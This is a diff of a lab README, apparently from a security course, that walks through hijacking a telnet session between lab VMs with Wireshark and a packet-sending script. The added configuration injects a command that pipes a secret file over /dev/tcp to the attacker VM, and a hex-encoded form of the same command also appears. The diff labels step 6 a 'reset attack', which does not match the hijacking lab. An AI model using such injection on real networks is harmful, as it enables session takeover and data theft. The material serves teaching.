@@ -6,7 +6,13 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 
 ### Setup
 
-3 Linux VMs. VM1 as the victim (telnet client); VM2 as the telnet server; VM3 as the attacker. The 3 VMs reside in the same network.
+3 Linux VMs. VM1 as the victim (telnet client); VM2 as the telnet server; VM3 as the attacker. The 3 VMs reside in the same network. This README uses the following IP addresses.
+
+| VM Name     | IP Address  |
+|-------------|-------------|
+| VM1         | 10.0.2.4    |
+| VM2         | 10.0.2.5    |
+| VM3         | 10.0.2.6    |
 
 ### Steps
 
@@ -14,13 +20,17 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 
 ![alt text](lab-tcp-hijack-telnet.png "Lab tcp session hijacking telnet")
 
-2. the client creates a secret file on the server.
+2. the client uses this *echo* command to create a secret file on the server.
 
+![alt text](lab-tcp-hijack-echo.png "Lab tcp session hijacking echo")
+
+3. the client uses the *cat* command to confirm the file now exists:
 ![alt text](lab-tcp-hijack-cat.png "Lab tcp session hijacking cat")
 
 3. let the attacker start monitoring network traffic using wireshark.
 
-![alt text](lab-tcp-hijack-capture.png "Lab tcp hijack capture")
+![alt text](lab-tcp-hijack-start-wireshark.png "Lab tcp hijack start wireshark")
+![alt text](lab-tcp-hijack-start-capture.png "Lab tcp hijack start capture")
 
 4. client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
 
@@ -37,7 +47,19 @@ This image shows the window size - still the same packet.
 This image shows the ttl attribute - still the same packet.
 ![alt text](lab-tcp-hijack-capture3.png "Lab tcp hijack latest tcp capture - part 3")
 
-6. the above packet provides the information which the attacker needs to know in order to perform the tcp session hijacking attack. now, the attacker, mimicking the **client**, needs to use the *netwox 40* command to inject a telnet command. The netwox command should be in this format: # sudo netwox 40 --ip4-src *source_ip* --ip4-dst *destination_ip* --tcp-src *source_port* --tcp-dst *destination_port* --tcp-seqnum *sequence_number* --ip4-ttl *ttl_value* --tcp-window *window_size* --tcp-ack --tcp-acknum *acknowledgment_number* --tcp-data "putyourdatahere,in hex format". Remember to replace these italic texts with information captured in wireshark. To run the command, the attacker opens a terminal window, types the *netwox 40* command, and press enter.
+6. the above packet provides the information which the attacker needs to know in order to perform the tcp reset attack. now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.
+
+```console
+source_ip = "10.0.2.4"
+destination_ip = "10.0.2.5"
+source_port = 55202
+destination_port = 23
+sequence_num = 834051386
+acknowledgment_num = 704733961
+ttl_value = 64
+window_size = 501
+tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
+```
 
 **Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the sequence number is *2523450797*, the acknowledgment number is *311613137*; the source port (in this example) is 57502, the destination port is 23. the tcp window size (in this example) is 245, the time to live (ttl) value is 64. The tcp data we can use is: "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d".
 
